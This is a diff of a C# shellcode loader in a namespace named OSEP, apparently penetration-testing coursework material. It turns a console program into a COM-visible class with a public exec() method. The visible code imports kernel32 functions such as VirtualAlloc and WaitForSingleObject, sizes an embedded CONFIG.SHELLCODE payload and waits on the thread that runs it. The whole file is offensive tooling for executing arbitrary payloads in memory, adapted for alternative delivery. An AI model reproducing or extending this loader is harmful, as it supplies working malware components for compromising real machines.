@@ -1,15 +1,20 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
+
 
 namespace OSEP
 {
-    class Entry
+
+    [ComVisible(true)]
+    public class OSEPRunner
     {
+
+        //IMPORT WIN32 API FUNCTIONS
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
@@ -19,10 +24,7 @@ namespace OSEP
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
-
-
-
-        static void Main(string[] args)
+        public static void exec()
         {
             int size = CONFIG.SHELLCODE.Length;
 
@@ -40,4 +42,6 @@ namespace OSEP
             WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
+
 }
+
